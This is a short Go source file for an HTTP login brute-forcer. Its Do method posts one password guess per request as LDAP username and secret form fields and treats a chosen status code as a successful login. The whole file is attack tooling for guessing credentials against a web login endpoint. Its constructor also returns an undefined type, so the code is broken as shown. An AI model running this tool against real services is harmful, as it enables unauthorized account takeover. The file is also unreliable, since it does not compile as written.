package main

import (
	"fmt"
	"strings"

	"github.com/valyala/fasthttp"
)

type FastHttpBruteImpl struct {
	method             string
	url                string
	username           string
	expectedStatusCode int
	headers            map[string]string
}

func NewFastHttpBruteImpl(method, url, username string, expectedStatusCode int, headers map[string]string) *NetHttpBruteImpl {
	return &NetHttpBruteImpl{
		method:             strings.ToUpper(method),
		url:                url,
		username:           username,
		expectedStatusCode: expectedStatusCode,
		headers:            headers,
	}
}

func (c *FastHttpBruteImpl) Do(password string) (bool, error) {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.Header.SetMethod(c.method)
	req.SetRequestURI(c.url)

	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`, c.username, password)
	req.SetBodyString(payload)

	for k, v := range c.headers {
		req.Header.Set(k, v)
	}

	err := fasthttp.Do(req, resp)
	if err != nil {
		return false, err
	}

	return resp.StatusCode() == c.expectedStatusCode, nil
}
